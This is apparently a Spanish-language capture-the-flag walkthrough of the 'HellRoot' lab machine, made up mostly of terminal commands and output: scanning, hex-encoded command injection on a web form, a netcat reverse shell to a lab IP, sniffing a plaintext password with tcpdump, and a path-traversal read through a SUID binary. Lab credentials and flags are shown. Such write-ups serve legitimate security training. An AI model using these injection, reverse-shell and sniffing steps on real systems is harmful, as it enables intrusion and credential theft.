
https://github.com/AlxSAGA/The-Hacker-Labs/blob/main/01-HackersLabs/02-medio/02-HellRoot.md




====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ cat scan.txt         
# Nmap 7.95 scan initiated Wed Sep 24 18:49:59 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -n -Pn -oN scan.txt 192.168.69.6
Nmap scan report for 192.168.69.6
Host is up (0.00017s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
222/tcp  open  rsh-spx
443/tcp  open  https
5000/tcp open  upnp
MAC Address: 08:00:27:E7:39:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Wed Sep 24 18:50:01 2025 -- 1 IP address (1 host up) scanned in 2.26 seconds
                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ 

====================================================================================================================================================================================
──(kali㉿kali)-[~/Documents/hellroot]
└─$ cat fullscan.txt 
# Nmap 7.95 scan initiated Wed Sep 24 18:50:35 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p22,80,222,443,5000 -n -Pn -vvv -oN fullscan.txt 192.168.69.6
Nmap scan report for 192.168.69.6
Host is up, received arp-response (0.00043s latency).
Scanned at 2025-09-24 18:50:35 EDT for 15s

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.62 (Debian)
222/tcp  open  ssh      syn-ack ttl 63 OpenSSH 10.0 (protocol 2.0)
443/tcp  open  ssl/http syn-ack ttl 63 nginx 1.29.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.29.0
|_http-title: Did not follow redirect to https://git.hellroot.thl/
| ssl-cert: Subject: commonName=git.hellroot.thl
| Issuer: commonName=git.hellroot.thl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-17T18:18:57
| Not valid after:  2026-07-17T18:18:57
| MD5:   2d27:59d5:42b5:8822:a9ce:052f:d2b3:5eb6
| SHA-1: 73b9:73ac:4eb1:15fe:6365:7393:bac5:02a3:7b29:0bd9
| -----BEGIN CERTIFICATE-----
| MIIDFzCCAf+gAwIBAgIUWPlmio8XwMeE5lKyMy47IM1UYnAwDQYJKoZIhvcNAQEL
| BQAwGzEZMBcGA1UEAwwQZ2l0LmhlbGxyb290LnRobDAeFw0yNTA3MTcxODE4NTda
| Fw0yNjA3MTcxODE4NTdaMBsxGTAXBgNVBAMMEGdpdC5oZWxscm9vdC50aGwwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC8djY2xYjHVy1QRqkMj9Qrt4HW
| P0MeiFsOs7SXfJtWD64j4SH38n/uCANxMAKufV4L5hEVcFjDDD+pbIM9q7cUXsPJ
| mZ3YiCy98TIk4P+8q8d5S1UQNKrDHDe4lNRxib+pbYD4nmNZuxaw0EwDHS9hVShX
| HYWIquyoh3iXOU/zTyk8kc6bczNJwfTEmrryd54+AnsOU7NG3TbjelnDIuE3lH/I
| fZ/ezEPXe0ucJIab9SYJMj/ckXDRwlr51lsyUzBp2HZ1Ha6mn2N/kF+E2wbIQl+I
| cvkZ2MR8Jrg9ezVLUuFuTt31uSPe7OCqNrAloRT31oQSm4xyDVCkclfkoPKTAgMB
| AAGjUzBRMB0GA1UdDgQWBBQiEbP8za2L052ptJkr/2H6tQRJKTAfBgNVHSMEGDAW
| gBQiEbP8za2L052ptJkr/2H6tQRJKTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
| DQEBCwUAA4IBAQB2BtmuA5lFAylAFy0T0wFpor+Qeh/X/WjkrWCEDkU1f69EJ22T
| l66TVmmZ5jqLck6Lv0gqv9K29f9WHw9NoLgHflNtjTnI53h8Wu4cUPnitquuMi5i
| fwcDW4TLHFmdoNwMiksYjUHtmSZ4To56Z9/4Je9Z68RSTyXkxCrDVdpiicPlKbXQ
| aMxHIMtfszYGoG8Q3L3sLH01P9artbYh9ppPEOMupxiBUjaDL39ATW0xdqbBDYJL
| BIR6YRwfMy8egyZvAw+PIcEjR/hbSMtC/p3jDg27G4cis8Qig+mQBG770VQ96MnY
| 0JqhmUaAzXqm42X8VEXGvXgw2BMmbTnRSIth
|_-----END CERTIFICATE-----
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
5000/tcp open  http     syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: Domain Lookup Service
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 08:00:27:E7:39:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 24 18:50:50 2025 -- 1 IP address (1 host up) scanned in 15.18 seconds
                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ 

====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ gobuster dir -u http://192.168.69.6:5000/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.69.6:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,css,js,txt,pdf,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2040]
/sniff.txt            (Status: 200) [Size: 72]
Progress: 1074060 / 1543927 (69.57%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1075943 / 1543927 (69.69%)
===============================================================
Finished
=================================

====================================================================================================================================================================================


http://192.168.69.6:5000/sniff.txt


Puede que haya ciertas herramientas que te permitan esnifar el trafico.


====================================================================================================================================================================================


Astro
/


000-default.conf
Dockerfile
index.php


 echo "astro:iloveastro"

====================================================================================================================================================================================
https://git.hellroot.thl/user/login


====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ gobuster dir -u http://192.168.69.6:5000/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.69.6:5000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,css,js,txt,pdf,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2040]
/sniff.txt            (Status: 200) [Size: 72]
Progress: 1074060 / 1543927 (69.57%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1075943 / 1543927 (69.69%)
===============================================================
Finished
===============================================================
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ 
====================================================================================================================================================================================

# gregar el dominio

https://git.hellroot.thl/Astro/hellroot.thl

┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ cat /etc/hosts                                    
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.69.6 hellroot.thl git.hellroot.thl


====================================================================================================================================================================================
http://192.168.69.6:5000/
====================================================================================================================================================================================

hex2bin("636174202F6574632F7061737377643B")
Que decodifica a: cat /etc/passwd; y lo ejecuta en el servido


 echo -n "cat /etc/passwd" | xxd -p




┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ echo -n "nc 192.168.69.3 4444 -e /bin/bash" | xxd -p

6e63203139322e3136382e36392e332034343434202d65202f62696e2f62617368
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ printf "nc 192.168.69.3 4444 -e /bin/bash" | xxd -p

6e63203139322e3136382e36392e332034343434202d65202f62696e2f62617368
       


                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ echo -n "nc 192.168.69.3 4444 -e /bin/bash;" | xxd -p

6e63203139322e3136382e36392e332034343434202d65202f62696e2f626173683b


====================================================================================================================================================================================


astro
iloveastro


====================================================================================================================================================================================




─$ nc -lvnp 4444    
listening on [any] 4444 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.6] 42630
/usr/bin/script -qc /bin/bash /dev/null
www-data@05cc10128c04:/var/www/html$ ls
ls
index.php  sniff.txt
www-data@05cc10128c04:/var/www/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
tcpdump:x:101:105::/nonexistent:/usr/sbin/nologin
astro:x:1001:1001::/home/astro:/bin/sh


====================================================================================================================================================================================


www-data@05cc10128c04:/var/www/html$ su astro
su astro
Password: iloveastro


====================================================================================================================================================================================


/usr/bin/script -qc /bin/bash /dev/null


====================================================================================================================================================================================
/usr/bin/script -qc /bin/bash /dev/null
astro@05cc10128c04:/var/www/html$ ls
ls
index.php  sniff.txt
astro@05cc10128c04:/var/www/html$ sudo su
sudo su
root@05cc10128c04:/var/www/html# ls
ls
index.php  sniff.txt
root@05cc10128c04:/var/www/html# ls -la
ls -la
total 20
drwxr-xr-x 1 www-data www-data 4096 Jul 19 12:45 .
drwxr-xr-x 1 root     root     4096 Jul 19 12:45 ..
drwxr-xr-x 2 root     root     4096 Jul 19 12:45 .config
-rw-r--r-- 1 www-data www-data 2860 Jul 18 18:57 index.php
-rw-r--r-- 1 www-data www-data   72 Jul 19 12:27 sniff.txt
root@05cc10128c04:/var/www/html# cd .config
cd .config
root@05cc10128c04:/var/www/html/.config# ls
ls
dpkg-l.txt  etc-apache2.tar  etc-php.tar
root@05cc10128c04:/var/www/html/.config# cat dpkg-l.txt
cat dpkg-l.txt
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                              Version                           Architecture Description
+++-=================================-=================================-============-===============================================================================
ii  adduser                           3.137ubuntu1                      all          add and remove users and groups
ii  apache2                           2.4.58-1ubuntu8.7                 amd64        Apache HTTP Server
ii  apache2-bin                       2.4.58-1ubuntu8.7                 amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                      2.4.58-1ubuntu8.7                 all          Apache HTTP Server (common files)
ii  apache2-utils                     2.4.58-1ubuntu8.7                 amd64        Apache HTTP Server (utility programs for web servers)
ii  apt                               2.8.3                             amd64        commandline package manager
ii  base-files                        13ubuntu10.2                      amd64        Debian base system miscellaneous files
ii  base-passwd                       3.6.3build1                       amd64        Debian base system master password and group files
ii  bash                              5.2.21-2ubuntu4                   amd64        GNU Bourne Again SHell
ii  bind9-dnsutils                    1:9.18.30-0ubuntu0.24.04.2        amd64        Clients provided with BIND 9
ii  bind9-host                        1:9.18.30-0ubuntu0.24.04.2        amd64        DNS Lookup Utility
ii  bind9-libs:amd64                  1:9.18.30-0ubuntu0.24.04.2        amd64        Shared Libraries used by BIND 9
ii  binutils                          2.42-4ubuntu2.5                   amd64        GNU assembler, linker and binary utilities
ii  binutils-common:amd64             2.42-4ubuntu2.5                   amd64        Common files for the GNU assembler, linker and binary utilities
ii  binutils-x86-64-linux-gnu         2.42-4ubuntu2.5                   amd64        GNU binary utilities, for x86-64-linux-gnu target
ii  bsdutils                          1:2.39.3-9ubuntu6.3               amd64        basic utilities from 4.4BSD-Lite
ii  ca-certificates                   20240203                          all          Common CA certificates
ii  composer                          2.7.1-2                           all          dependency manager for PHP
ii  coreutils                         9.4-3ubuntu6                      amd64        GNU core utilities
ii  cpp                               4:13.2.0-7ubuntu1                 amd64        GNU C preprocessor (cpp)
i
ii  libfreetype6:amd64                2.13.2+dfsg-1build3               amd64        FreeType 2 font engine, shared library files

ii  publicsuffix                      20231001.0357-0.1                 all          accurate, machine-readable list of domain name suffixes
ii  rpcsvc-proto                      1.4.2-0ubuntu7                    amd64        RPC protocol compiler and definitions
ii  sed                               4.9-2build1                       amd64        GNU stream editor for filtering/transforming text
ii  sensible-utils                    0.0.22                            all          Utilities for sensible alternative selection
ii  ssl-cert                          1.1.2ubuntu1                      all          simple debconf wrapper for OpenSSL
ii  sudo                              1.9.15p5-3ubuntu5.24.04.1         amd64        Provide limited super user privileges to specific users
ii  sysvinit-utils                    3.08-6ubuntu3                     amd64        System-V-like utilities
ii  tar                               1.35+dfsg-3build1                 amd64        GNU version of the tar archiving utility
ii  tcpdump                           4.99.4-3ubuntu4                   amd64        command-line network traffic analyzer
ii  tzdata                            2025b-0ubuntu0.24.04.1            all          time zone and daylight-saving time data
ii  ubuntu-keyring                    2023.11.28.1                      all          GnuPG keys of the Ubuntu archive
ii  ucf                               3.0043+nmu1                       all          Update Configuration File(s): preserve user changes to config files
ii  unminimize                        0.2.1                             amd64        Un-minimize your minimial images or setup
ii  unzip                             6.0-28ubuntu4.1                   amd64        De-archiver for .zip files
ii  util-linux                        2.39.3-9ubuntu6.3                 amd64        miscellaneous system utilities
ii  xauth                             1:1.1.2-1build1                   amd64        X authentication utility
ii  xz-utils                          5.6.1+really5.4.5-1ubuntu0.2      amd64        XZ-format compression utilities
ii  zlib1g:amd64                      1:1.3.dfsg-3.1ubuntu2.1           amd64        compression library - runtime
root@05cc10128c04:/var/www/html/.config# ip add
ip add
bash: ip: command not found
root@05cc10128c04:/var/www/html/.config# ifcondif
ifcondif
bash: ifcondif: command not found
root@05cc10128c04:/var/www/html/.config# ip  
ip 
bash: ip: command not found
root@05cc10128c04:/var/www/html/.config# ls



====================================================================================================================================================================================

astro@05cc10128c04:/var/www/html/.config$ whoami
whoami
astro

====================================================================================================================================================================================

astro@05cc10128c04:/var/www/html/.config$ sudo -l
sudo -l
Matching Defaults entries for astro on 05cc10128c04:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
astro@05cc10128c04:/var/www/html/.config$ 

astro@05cc10128c04:/var/www/html/.config$ sudo su
sudo su
root@05cc10128c04:/var/www/html/.config# whoami
whoami
root
root@05cc10128c04:/var/www/html/.config# 

====================================================================================================================================================================================




tcpdump -A -s0 -w capture.pcap &


killall tcpdump


tcpdump -nn -v -r capture.pcap 



root@05cc10128c04:/var/www/html#  tcpdump -A -s0 -w capture.pcap &
 tcpdump -A -s0 -w capture.pcap &
[1] 84
root@05cc10128c04:/var/www/html# tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes


root@05cc10128c04:/var/www/html# tcpdump -A -s0 -w capture.pcap &
tcpdump -A -s0 -w capture.pcap &
[2] 85
root@05cc10128c04:/var/www/html# tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
killall tcpdump
killall tcpdump
46 packets captured
49 packets received by filter
0 packets dropped by kernel
14 packets captured
18 packets received by filter
0 packets dropped by kernel
root@05cc10128c04:/var/www/html# ls
ls
capture.pcap  index.php  sniff.txt
[1]-  Done                    tcpdump -A -s0 -w capture.pcap
[2]+  Done                    tcpdump -A -s0 -w capture.pcap
root@05cc10128c04:/var/www/html# tcpdump -nn -v -r capture.pcap 
tcpdump -nn -v -r capture.pcap 
reading from file capture.pcap, link-type EN10MB (Ethernet), snapshot length 262144
11:57:32.545983 IP (tos 0x0, ttl 64, id 14036, offset 0, flags [DF], proto TCP (6), length 139)
    172.17.0.2.45104 > 192.168.69.3.4444: Flags [P.], cksum 0xb23c (incorrect -> 0xc41e), seq 2868149719:2868149806, ack 4053057232, win 502, options [nop,nop,TS val 891889715 ecr 4216400102], length 87
11:57:32.546269 IP (tos 0x0, ttl 63, id 26564, offset 0, flags [DF], proto TCP (6), length 52)
    192.168.69.3.4444 > 172.17.0.2.45104: Flags [.], cksum 0xa640 (correct), ack 87, win 510, options [nop,nop,TS val 4216400124 ecr 891889715], length 0
11:57:37.701810 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 172.17.0.2 tell 172.17.0.1, length 28
11:57:37.701817 ARP, Ethernet (len 6), IPv4 (len 4), Reply 172.17.0.2 is-at 02:42:ac:11:00:02, length 28
11:58:01.918923 IP (tos 0x0, ttl 64, id 57538, offset 0, flags [DF], proto TCP (6), length 60)
    172.17.0.1.55210 > 172.17.0.2.80: Flags [S], cksum 0x5854 (incorrect -> 0x4a17), seq 2146033897, win 64240, options [mss 1460,sackOK,TS val 2475548278 ecr 0,nop,wscale 7], length 0
11:58:01.918935 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    172.17.0.2.80 > 172.17.0.1.55210: Flags [S.], cksum 0x5854 (incorrect -> 0xe124), seq 730322771, ack 2146033898, win 65160, options [mss 1460,sackOK,TS val 1059464008 ecr 2475548278,nop,wscale 7], length 0
11:58:01.918951 IP (tos 0x0, ttl 64, id 57539, offset 0, flags [DF], proto TCP (6), length 52)
    172.17.0.1.55210 > 172.17.0.2.80: Flags [.], cksum 0x584c (incorrect -> 0x0c84), ack 1, win 502, options [nop,nop,TS val 2475548278 ecr 1059464008], length 0
11:58:01.918984 IP (tos 0x0, ttl 64, id 57540, offset 0, flags [DF], proto TCP (6), length 275)
    172.17.0.1.55210 > 172.17.0.2.80: Flags [P.], cksum 0x592b (incorrect -> 0x57b0), seq 1:224, ack 1, win 502, options [nop,nop,TS val 2475548278 ecr 1059464008], length 223: HTTP, length: 223
        POST /login HTTP/1.1
        Host: 172.17.0.2
        User-Agent: curl/7.88.1
        Accept: */*
        Content-Length: 74
        Content-Type: application/x-www-form-urlencoded

        username=astro&password=wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS [|http]
11:58:01.918994 IP (tos 0x0, ttl 64, id 44015, offset 0, flags [DF], proto TCP (6), length 52)
    172.17.0.2.80 > 172.17.0.1.55210: Flags [.], cksum 0x584c (incorrect -> 0x0b9f), ack 224, win 508, options [nop,nop,TS val 1059464008 ecr 2475548278], length 0
11:58:01.919253 IP (tos 0x0, ttl 64, id 44016, offset 0, flags [DF], proto TCP (6), length 547)
    172.17.0.2.80 > 172.17.0.1.55210: Flags [P.], cksum 0x5a3b (incorrect -> 0xebf1), seq 1:496, ack 224, win 508, options [nop,nop,TS val 1059464008 ecr 2475548278], length 495: HTTP, length: 495
        HTTP/1.1 404 Not Found
        Date: Thu, 25 Sep 2025 11:58:01 GMT
        Server: Apache
        X-Frame-Options: SAMEORIGIN
        X-Content-Type-Options: nosniff
        Referrer-Policy: strict-origin
        Content-Length: 256
        Content-Type: text/html; charset=iso-8859-1

        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        <hr>
        <address>Apache Server at 172.17.0.2 Port 80</address>
        </body></html>
11:58:01.919292 IP (tos 0x0, ttl 64, id 57541, offset 0, flags [DF], proto TCP (6), length 52)
    172.17.0.1.55210 > 172.17.0.2.80: Flags [.], cksum 0x584c (incorrect -> 0x09b7), ack 496, win 501, options [nop,nop,TS val 2475548278 ecr 1059464008], length 0
11:58:01.919660 IP (tos 0x0, ttl 64, id 57542, offset 0, flags [DF], proto TCP (6), length 52)
    172.17.0.1.55210 > 172.17.0.2.80: Flags [F.], cksum 0x584c (incorrect -> 0x09b5), seq 224, ack 496, win 501, options [nop,nop,TS val 2475548279 ecr 1059464008], length 0
11:58:01.919712 IP (tos 0x0, ttl 64, id 44017, offset 0, flags [DF], proto TCP (6), length 52)
    172.17.0.2.80 > 172.17.0.1.55210: Flags [F.], cksum 0x584c (incorrect -> 0x09ac), seq 496, ack 225, win 508, options [nop,nop,TS val 1059464009 ecr 2475548279], length 0
11:58:01.919729 IP (tos 0x0, ttl 64, id 57543, offset 0, flags [DF], proto TCP (6), length 52)
    172.17.0.1.55210 > 172.17.0.2.80: Flags [.], cksum 0x584c (incorrect -> 0x09b3), ack 497, win 501, options [nop,nop,TS val 2475548279 ecr 1059464009], length 0
tcpdump: pcap_loop: invalid packet capture length 1935767328, bigger than snaplen of 262144
root@05cc10128c04:/var/www/html# 






====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/hellroot]
└─$ ssh astro@192.168.69.6           

astro@192.168.69.6's password: wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS


====================================================================================================================================================================================


astro@hellroot:~$ 
astro@hellroot:~$ whoami
astro
astro@hellroot:~$ ls
user.txt
astro@hellroot:~$ cat user.txt 
f220dcf45ccfc10c4c44ea8c413186f2
astro@hellroot:~$ 
astro@hellroot:~$ 
astro@hellroot:~$ 


astro@hellroot:~$ find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/secmonitor
/usr/local/bin/logview
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
astro@hellroot:~$ 





logview ../../root/root.txt




astro@hellroot:~$ 
logview ../../root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log/../../root/root.txt
f039facf1ae0d69b07484df1c4da32df
astro@hellroot:~$ 
